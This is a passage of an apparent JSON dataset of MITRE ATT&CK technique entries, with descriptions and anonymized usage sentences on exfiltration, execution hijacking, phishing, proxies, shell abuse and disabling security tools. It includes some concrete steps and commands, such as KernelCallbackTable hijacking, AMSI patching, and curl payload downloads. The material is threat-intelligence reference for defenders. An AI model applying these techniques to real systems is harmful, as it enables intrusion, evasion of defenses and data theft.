      "contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.",
      "exfiltrates collected files via removable media from air-gapped victims.",
      "has exfiltrated data using USB storage devices.",
      "has used a customized  variant which could exfiltrate documents from air-gapped networks.",
      "creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.",
      "has a feature to copy files from every drive onto a removable drive in a hidden folder."
    ],
    "description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "similar_words": [
      "Exfiltration over USB"
    ],
    "id": "T1052.001"
  },
  "attack-pattern--a4657bc9-d22f-47d2-a7b7-dd6ec33f3dde": {
    "name": "KernelCallbackTable",
    "example_uses": [
      "has abused the KernelCallbackTable to hijack process control flow and execute shellcode.",
      "has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created  stub routine."
    ],
    "description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.(Citation: Windows Process Injection KernelCallbackTable)An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
    "similar_words": [
      "KernelCallbackTable"
    ],
    "id": "T1574.013"
  },
  "attack-pattern--a51eb150-93b1-484b-a503-e51453b127a4": {
    "name": "Search Closed Sources",
    "example_uses": [
      "has searched for information on targeted individuals on business databases including RocketReach and CrunchBase."
    ],
    "description": "Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
    "similar_words": [
      "Search Closed Sources"
    ],
    "id": "T1597"
  },
  "attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21": {
    "name": "Systemd Timers",
    "example_uses": [],
    "description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the systemctl command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)",
    "similar_words": [
      "Systemd Timers"
    ],
    "id": "T1053.006"
  },
  "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b": {
    "name": "Phishing",
    "example_uses": [
      "has been spread through spear phishing.",
      "has used spear phishing to initially compromise victims.",
      "has been spread through the use of phishing campaigns including call back phishing where victims are lured into calling a number provided through email.",
      "has conducted malicious spam (malspam) campaigns to gain access to victim's machines.",
      "campaigns have used spearphishing emails for initial access.",
      "has used phishing to gain initial access.",
      "has used spearphishing to gain initial access and intelligence.",
      "used spear phishing to gain initial access to victims."
    ],
    "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\").(Citation: phishing-krebs)Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
    "similar_words": [
      "Phishing"
    ],
    "id": "T1566"
  },
  "attack-pattern--a6557c75-798f-42e4-be70-ab4502e0a3bc": {
    "name": "ROMMONkit",
    "example_uses": [],
    "description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",
    "similar_words": [
      "ROMMONkit"
    ],
    "id": "T1542.004"
  },
  "attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d": {
    "name": "Compiled HTML File",
    "example_uses": [
      "has used a CHM payload to load and execute another malicious file once delivered to a victim.",
      "leveraged a compiled HTML file that contained a command to download and run an executable.",
      "has weaponized CHM files in their phishing campaigns.",
      "used compiled HTML (.chm) files for targeting.",
      "has used CHM files to move concealed payloads.",
      "uses ActiveX objects for file execution and manipulation."
    ],
    "description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",
    "similar_words": [
      "Compiled HTML File"
    ],
    "id": "T1218.001"
  },
  "attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c": {
    "name": "Network Share Connection Removal",
    "example_uses": [
      "The net use \\\\system\\share /delete command can be used in  to remove an established connection to a network share.",
      "disconnects all network shares from the computer with the command net use * /DELETE /Y.",
      "can disconnect previously connected remote drives.",
      "has detached network shares after exfiltrating files likely to evade detection.",
      "can remove network shares from infected systems."
    ],
    "description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the net use \\\\system\\share /delete command. (Citation: Technet Net Use)",
    "similar_words": [
      "Network Share Connection Removal"
    ],
    "id": "T1070.005"
  },
  "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d": {
    "name": "Multi-hop Proxy",
    "example_uses": [
      "uses a copy of tor2web proxy for HTTPS communications.",
      "uses  for command and control.",
      "has used  relays for Command and Control servers.",
      "has used  for C2.",
      "has used  for C2 communication.",
      "has routed traffic over  and VPN servers to obfuscate their activities.",
      "During  the threat actors used a layer of proxies to manage C2 communications.",
      "used chains of compromised routers to proxy C2 communications between them and cloud service providers.",
      "has used multi-hop proxies to disguise the source of their malicious traffic.",
      "During  threat actors executed commands through the installed web shell via  exit nodes.",
      "can use implants on multiple compromised machines to proxy communications through its worldwide P2P network.",
      "has used  to log in to victims' email accounts.",
      "uses  to communicate with C2.",
      "A backdoor used by  created a  hidden service to forward traffic from the  client to local ports 3389 (RDP) 139 (Netbios) and 445 (SMB) enabling full remote access from outside the network and has also used TOR.",
      "has the ability to use a proxy chain with up to 255 hops when using TCP.",
      "Traffic traversing the  network will be forwarded to multiple nodes before exiting the  network and continuing on to its intended destination.",
      "has abused the NKN public blockchain protocol for its C2 communications.",
      "downloads and installs  via homebrew.",
      "has used  nodes for C2 traffic.",
      "has abused NKN infrastructure for its C2 communication.",
      "can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.",
      "used  nodes for C2.",
      "uses  for command and control traffic.",
      "can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.",
      "can chain together multiple compromised machines as proxies to reach their final targets.",
      "has configured multi-hop proxies via ProxyChains within victim environments.",
      "has utilized an ORB (operational relay box) network  consisting compromised devices such as small office and home office (SOHO) routers IoT devices and leased virtual private servers (VPS)  to proxy traffic.",
      "has used multi-hop proxies for command-and-control infrastructure.",
      "The  client can be configured to connect to the server through a proxy.",
      "has routed traffic through chains of compromised network devices to proxy C2 communications.",
      "has routed traffic through a customized  relay network layer.",
      "has used tools such as the publicly available HTran tool for proxying traffic in victim environments.",
      "is capable of relaying traffic from command and control servers to follow-on systems."
    ],
    "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.For example, adversaries may construct or use onion routing networks  such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network  to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing) Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.(Citation: ORB Mandiant) In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organizations Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)",
    "similar_words": [
      "Multi-hop Proxy"
    ],
    "id": "T1090.003"
  },
  "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56": {
    "name": "Unix Shell",
    "example_uses": [
      "is initially installed and executed through an initial shell script.",
      "has the ability to use /bin/sh to execute commands.",
      "has used shell scripts for execution.",
      "has leveraged /bin/sh and /bin/bash to execute commands on the victim machine.",
      "can execute remote commands using bash scripts.",
      "has used Unix shell scripts to execute commands in the victim environment.",
      "can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt.",
      "used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.",
      "is capable of creating a remote Bash shell and executing commands.",
      "can use Unix shell script for command execution.",
      "provides a reverse shell connection on 8338/TCP encrypted via AES.",
      "provides a BusyBox reverse shell for command and control.",
      "can execute arbitrary commands as root on a compromised system.",
      "uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the /tmp folder.",
      "can execute payloads via shell scripting.",
      "used shell scripts to launch various services and to start/stop the QEMU virtualization.",
      "has used shell scripts to execute commands after installation and set persistence mechanisms.",
      "can use the open command to execute an application.",
      "can use bash scripts to check the macOS version download payloads and extract bytes from files.  uses the command sh -c tail -c +1381... to extract bytes at an offset from a specified file.  uses the curl -fsL $url >$tmp_path command to download malicious payloads into a temporary directory.",
      "has the ability to use /bin/bash and /bin/sh to execute commands.",
      "uses /bin/bash to execute commands on the victims machine.",
      "has executed shell scripts with /bin/sh.",
      "executes a bash script to establish a reverse shell.",
      "can use `/bin/sh` to create a reverse shell and execute commands.",
      "has the ability to receive shell commands over a Unix domain socket.",
      "executed file /bin/pwd in activity exploiting CVE-2019-19781 against Citrix devices.",
      "can use a simple bash script for execution.",
      "can use shell scripts for execution such as /bin/sh -c.",
      "has used pm.sh to download and install its main payload.",
      "can execute supplied shell commands and uses bash scripts to perform additional actions.",
      "has the capability to create a reverse shell on victims.",
      "has a command to execute a shell command on the system.",
      "has used a Unix shell script to run a series of commands targeting macOS.",
      "uses a shell script to execute Mach-o files and osacompile commands such as osacompile -x -o xcode.app main.applescript.",
      "uses macOS' .command file type to script actions.",
      "has used shell scripts for execution.",
      "has the ability to create and execute commands in a remote shell for CLI.",
      "used malicious shell scripts in Linux environments following access via SSH to install Linux versions of Winnti malware.",
      "can use the commands `Xcsh` or `Xcls` to open a shell with  level permissions and `Xxsh` to open a shell with root level.",
      "can spawn a bash shell to enable execution on compromised hosts.",
      "utilizes multiple Bash scripts during botnet installation stages and the final botnet payload allows for running commands in the Bash shell.",
      "has used Brightmetricagent.exe which contains a command- line interface (CLI) library that can leverage command shells including Z Shell (zsh).",
      "used Linux shell commands for system survey and information gathering prior to exploitation of vulnerabilities such as CVE-2019-19871.",
      "can create a reverse shell and supports vt100 emulator formatting.",
      "is capable of spawning a remote command shell.",
      "creates the reverse shell using a pthread spawning a bash shell.",
      "During  threat actors piped output from stdout to bash for execution.",
      "used a custom tool VELVETSTING to parse encoded inbound commands to compromised F5 BIG-IP devices and then execute them via the Unix shell.",
      "has executed multiple Bash controller scripts to provide command line inputs for FLORAHOX traversal configurations.",
      "reads command line arguments and parses them for functionality when executed from a Linux shell and can execute arbitrary strings passed to it as shell commands.",
      "used shell scripts for post-exploitation execution in victim environments.",
      "The  agent is executed through a command line argument which specifies an interface and listening port."
    ],
    "description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.Some systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.",
    "similar_words": [
      "Unix Shell"
    ],
    "id": "T1059.004"
  },
  "attack-pattern--a9e2cea0-c805-4bf8-9e31-f5f0513a3634": {
    "name": "Outlook Forms",
    "example_uses": [
      "can be used to automate the abuse of Outlook Forms to establish persistence."
    ],
    "description": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)Once malicious forms have been added to the users mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)",
    "similar_words": [
      "Outlook Forms"
    ],
    "id": "T1137.003"
  },
  "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579": {
    "name": "Disable or Modify Tools",
    "example_uses": [
      "kills antimalware running process.",
      "attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.",
      "can attempt to stop security software.",
      "has attempted to disable built-in security protections such as Windows AMSI.",
      "kills and disables services for Windows Security Center and Windows Defender.",
      "has used a AMSI bypass which patches the in-memory amsi.dll in PowerShell scripts to bypass Windows antimalware products.",
      "has stopped services related to anti-virus.",
      "can detect and terminate active security software-related processes on infected systems.",
      "`amsiPatch.py` module can disable Antimalware Scan Interface (AMSI) functions.",
      "can connect to and disable the Symantec server on the victim's network.",
      "has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.",
      "can disable Microsoft Office Protected View by changing Registry keys.",
      "installation has been immediately preceded by a task kill command in order to disable anti-virus.",
      "can alter the victim's proxy configuration.",
      "looks for and attempts to stop anti-malware solutions.",
      "can disable SELinux Role-Based Access Control and deactivate PAM modules.",
      "can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\\ drive.",
      "can disable the system's local proxy settings.",
      "can uninstall or disable security products.",
      "can change Internet Explorer settings to reduce warnings about malware activity.",
      "has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.",
      "can add itself to the exclusion list for the Ivanti Connect Secure Integrity Checker Tool if the `--exclude` parameter is passed by the `tar` process.",
      "can disarm Windows Defender during the UAC process to evade detection.",
      "During the   used the service control manager on a remote system to disable services associated with security monitoring products.",
      "can lower security settings by changing Registry keys.",
      "used  to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.",
      "has executed a batch script designed to disable Windows Defender on a compromised host.",
      "was used to kill endpoint security processes.",
      "has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.",
      "has the capability to stop antivirus services and disable Windows Defender.",
      "can add directories used by the malware to the Windows Defender exclusions list to prevent detection.",
      "will terminate processes associated with several security software products if identified during execution.",
      "has disabled and uninstalled security tools such as Alibaba Tencent and BMC cloud monitoring agents on cloud-based infrastructure.",
      "has deployed a utility script named kill.bat to disable anti-virus.",
      "kills anti-virus found on the victim.",
      "has used malware to disable Windows Defender.",
      "has delivered macros which can tamper with Microsoft Office security settings.",
      "has modified DNS resolvers to evade DNS monitoring tools.",
      "can hook APIs kill processes break file system paths and change ACLs to prevent security tools from running.",
      "will attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials.",
      "can attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list.",
      "has the ability to disable Microsoft Outlook's security policies to disable macro warnings.",
      "uses the function kill_unwanted to obtain a list of running processes and kills each process matching a list of security related processes.",
      "can disable Windows Defender.",
      "has incorporated code into several tools that attempts to terminate anti-virus processes.",
      "will search for Windows services that are associated with antivirus software on the system and kill the process.",
      "malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.",
      "Malware used by  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).",
      "has disabled antivirus services on targeted systems in order to upload malicious payloads.",
      "has attempted to stop endpoint detection and response (EDR) tools on compromised systems.",
      "can stop anti-virus services on a compromised host.",
      "has a function to kill processes associated with defenses and can prevent certain processes from launching.",
      "terminates anti-malware processes if theyre found running on the system.",
      "stops processes related to security and management software.",
      "malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services..",
      "has disabled Windows Defender to evade protections.",
      "identifies and kills anti-malware processes.",
      "has the capability to kill any running analysis processes and AV software.",
      "can disable Avira anti-virus.",
      "can disable Security Center functions like anti-virus.",
      "can kill AV products' processes.",
      "can modify the victim's anti-virus.",
      "has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.",
      "terminates various services related to system security and Windows.",
      "used scripts which detected and uninstalled antivirus software.",
      "has attempted to terminate/stop processes and services associated with endpoint security products.",
      "can patch Antimalware Scan Interface (AMSI) Windows Lockdown Policy (WLDP) as well as exit-related  functions to avoid process termination.",
      "has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.",
      "has disabled dynamic analysis and other security tools including IDA debugger x32dbg and OllyDbg. It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.",
      "During  threat actors disabled logging and modified the `compcheckresult.cgi` component to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection.",
      "has searched for the Activity Monitor process in the System Events process list and kills the process if running.  also searches the operating system's `install.log` for apps matching its hardcoded list killing all matching process names.",
      "kills security tools like Wireshark that are running.",
      "has the ability to set SELinux to permissive mode.",
      "During the   modified in-registry internet settings to lower internet security.",
      "terminates antimalware processes.",
      "has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.",
      "During  threat actors disabled anti-virus and anti-spyware tools in some instances on the victims machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.",
      "has functionality to disable security tools including Kaspersky BitDefender and MalwareBytes.",
      "can change browser security settings to enable extensions to be installed.  uses the pkill cfprefsd command to prevent users from inspecting processes.",
      "has a feature to disable Windows Task Manager.",
      "can use SystemSettingsAdminFlows.exe a native Windows utility to disable Windows Defender.",
      "used various scripts to remove or disable security tools such as http_watchdog and firewallsd as well as tools related to other botnet infections such as mips_ff on victim devices.",
      "used several mechanisms to try to disable security tools.  attempted to modify EDR-related services to disable auto-start on system reboot.  used a publicly available driver GMER64.sys typically used for anti-rootkit functionality to selectively stop and remove security software processes.",
      "used  to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.  has used `MpCmdRun` to revert the definitions in Microsoft Defender. Additionally  has used WMI to stop or uninstall and reset anti-virus products and other defensive services.",
      "removes the Volume Shadow Copy (VSS) service from infected devices along with all present shadow copies.",
      "has used tools including GMER IOBit and PowerTool to disable antivirus software.",
      "can add an exception to Microsoft Defender that excludes the entire main drive from anti-malware scanning to evade detection.",
      "During  threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus.",
      "uses the NirSoft AdvancedRun utility to disable Microsoft Defender Antivirus through stopping the WinDefend service on victim machines.  disables Windows Defender via registry key changes.",
      "will modify registry entries and scheduled task objects associated with Windows Defender to disable its functionality.",
      "loads a copy of NTDLL to evade hooks from security monitoring tools on this library.  can add the path of its executable to the Microsoft Defender exclusion list.",
      "attempted to disable local security tools and endpoint detection and response (EDR) software during operations.",
      "has attempted to bypass Windows Antimalware Scan Interface (AMSI) by removing the string AmsiScanBuffer from the clr.dll module in memory to prevent it from being called.",
      "has disabled or modified security tools for defense evasion.",
      "disables protectors used to secure the BitLocker encryption key on victim systems.",
      "can disable security tools to evade detection including Windows Defender.",
      "can disable firewall rules and anti-malware and monitoring software including Windows Defender.",
      "modified the Authentication Authorization and Accounting (AAA) function of targeted Cisco ASA appliances to allow the threat actor to bypass normal AAA operations.",
      "disabled security tools such as Windows Defender and the Raccine anti-ransomware tool during operations.",
      "contains an unused capability to block endpoint security solutions from loading user-mode code hooks via a DLL in a specified process by using the `UpdateProcThreadAttributeAPI` to set the `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` to `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` for an identified process.",
      "has unhooked DLLs to disable endpoint detection and response (EDR) or anti-virus (AV) tools.",
      "adds .JS and .EXE extensions to the Microsoft Defender exclusion list.  terminates and removes the Raccine anti-ransomware utility."
    ],
    "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tools exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)Adversaries may also focus on specific applications such as Sysmon. For example, the Start and Enable values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
    "similar_words": [
      "Disable or Modify Tools"
    ],
    "id": "T1562.001"
  },
  "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931": {
    "name": "Data Manipulation",
    "example_uses": [
      "has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money."
    ],
    "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "similar_words": [
      "Data Manipulation"
    ],
    "id": "T1565"
  },
  "attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d": {
    "name": "Inter-Process Communication",
    "example_uses": [
      "can listen over the Unix domain socket located at `/data/runtime/cockpit/wd.fd`.",
      "has the ability to move data between its kernel and user mode components generally using named pipes.",
      "can connect to the IPC$ share on remote machines.",
      "has the ability to create a pipe to enable inter-process communication.",
      "When executing with non-root permissions  uses the the `shmget API` to create shared memory between other known  processes. This allows processes to communicate with each other and share their PID.",
      "can use pipes to redirect the standard input and the standard output.",
      "contains an embedded custom  network client that communicates with the primary payload via shared process memory.",
      "can pipe command output to a targeted process.",
      "can retrieve output from arbitrary processes and shell commands via a pipe.",
      "can use interprocess communication (IPC) to enable the designation of multiple files for exfiltration in a scalable manner.",
      "During  threat actors wrote output to stdout then piped it to bash for execution.",
      "can read the results of command line execution via an unnamed pipe connected to the process."
    ],
